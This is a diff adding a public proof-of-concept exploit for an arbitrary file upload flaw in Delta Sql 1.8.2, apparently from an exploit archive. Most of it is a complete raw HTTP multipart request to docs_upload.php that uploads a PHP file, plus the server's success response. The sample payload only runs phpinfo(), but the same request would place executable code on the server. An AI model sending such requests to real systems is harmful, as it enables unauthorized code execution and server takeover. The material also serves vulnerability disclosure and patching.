@@ -1,0 +1,71 @@
+# Exploit Title: Delta Sql 1.8.2 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-10-25
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://deltasql.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/deltasql/files/latest/download
+# Software Link: http://deltasql.sourceforge.net/deltasql/
+# Version: 1.8.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/docs_manage.php?id=1
+# 
+# http://localhost/[PATH]/upload/[FILE]
+ 
+POST /[PATH]/docs_upload.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/[PATH]/docs_manage.php?id=1
+Cookie: PHPSESSID=ra5c0bgati64a01fag01l8hhf0
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------158943328914318561992147220435
+Content-Length: 721
+-----------------------------158943328914318561992147220435
+Content-Disposition: form-data; name="fileToUpload"; filename="Efe.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------158943328914318561992147220435
+Content-Disposition: form-data; name="submit"
+Upload File
+-----------------------------158943328914318561992147220435
+Content-Disposition: form-data; name="id"
+1
+-----------------------------158943328914318561992147220435
+Content-Disposition: form-data; name="version"
+-----------------------------158943328914318561992147220435
+Content-Disposition: form-data; name="hasdocs"
+-----------------------------158943328914318561992147220435--
+HTTP/1.1 200 OK
+Date: Thu, 24 Oct 2018 00:24:27 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1783
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<body>
+<form action="http://localhost/[PATH]/docs_upload.php" method="post" enctype="multipart/form-data">
+    Select document to upload:
+    <input name="fileToUpload" id="fileToUpload" type="file">
+    <input value="Ver Ayari" name="submit" type="submit">
+	<input value="1" name="id" type="hidden">
+	<input value="1'" name="version" type="hidden">
+	<input value="1" name="hasdocs" type="hidden">
+</form>
+</body>
+</html>
